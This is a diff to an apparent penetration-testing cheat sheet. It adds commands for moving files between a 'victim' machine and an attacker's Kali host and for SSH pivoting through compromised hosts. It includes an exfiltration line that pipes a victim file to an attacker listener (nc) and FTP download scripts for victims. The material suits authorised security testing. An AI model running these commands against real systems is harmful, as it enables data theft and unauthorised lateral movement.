@@ -33,7 +33,7 @@
     > **DirSearch**: Web Enumerating
 
     ```pwsh
-    dirsearch -u http://<RHOST>:<RPORT>/ -t 16 -r -e txt,html,php,asp,aspx,jsp -f -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt tcp_80_http_dirsearch_dirbuster.txt" --exclude-texts="<TEXT>"
+    dirsearch -u http://<RHOST>:<RPORT>/ -t 16 -r -e txt,html,php,asp,aspx,jsp -f -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --exclude-texts="<TEXT>"
      ```
 
 
@@ -90,6 +90,32 @@
     scp <LPATH> <RUSER>@<RHOST>:<RPATH>
     ```
 
+    > **IPP**: From Victm (Linux) to Kali
+
+    ```pwsh
+    Vict$ /dev/shm/ipp <LHOST> <LPORT> < <FILE>
+    KALI$ nc -lvnp <LPORT> > <FILE>
+    ```
+
+    > **FTP**: From Kali to Victim (Linux)
+
+    ```pwsh
+    KALI$ pyftp
+    Vict> echo "open 127.0.0.1 21\nuser anonymous anonymous\nbin\ncd <PATH>\nget <FILE>\nbye" | ftp -inv
+    ```
+
+    > **FTP**: From Kali to Victim (Windows)
+
+    ```pwsh
+    KALI$ pyftp
+    Vict> echo OPEN <KALI> <KPORT> > FTP.txt
+    Vict> echo USER anonymous >> FTP.txt
+    Vict> echo CD <FOLDER> >> FTP.txt
+    Vict> echo BIN >> FTP.txt
+    Vict> echo GET <FILE> >> FTP.txt
+    Vict> ftp -v -n -s:ftp.txt
+    ```
+
 + ### Pivoting
 
     > **SShuttle**: VPN-Like Network Access
@@ -103,15 +129,24 @@
     > Dynamic with SSH & ProxyChains
 
     ```pwsh
-    > ssh -D 9050 <RUSER>@<RHOST> -p 22
+    > ssh -N -D 127.0.0.1:9040 <RUSER>@<RHOST>
+    > export PROXYCHAINS_SOCKS4=9040
     > export PROXYCHAINS_SOCKS5=9050
-    > proxychains nmap -Pn -n -v -sV -sC <IP>
+    > proxychains nmap -Pn -n -sV -sC 127.0.0.1
     ```
 
-    > Static with SSH
+    > Forward Static with SSH: Kali => Victim A => Victim B
 
     ```pwsh
-    ssh -g -L <LPORT>:localhost:<RPORT> <RUSER>@<RHOST>
+    ssh -N -L 127.0.0.1:<LPORT>:<THOST>:<TPORT> <RUSER>@<RHOST>
+    ```
+
+    > Reverse Static with SSH: Kali <= Victim A
+
+    > Note: Usefull with Low Privilage Shells
+
+    ```pwsh
+    ssh -N -R <KALI>:<LPORT>:127.0.0.1:<RPORT> <ROOT>@<KALI>
     ```
 
 + ### Password Cracking
@@ -155,7 +190,15 @@
 
     ```pwsh
     > ps aux
-    > ps aux | grep lfmserver
+    > ps aux | grep <PROCESS-NAME>
+    ```
+
++ ### Liseners
+
+    > List Liseners
+
+    ```pwsh
+    > ss -antp | grep <PORT>
     ```
 
 + ### Add Local Sudoer
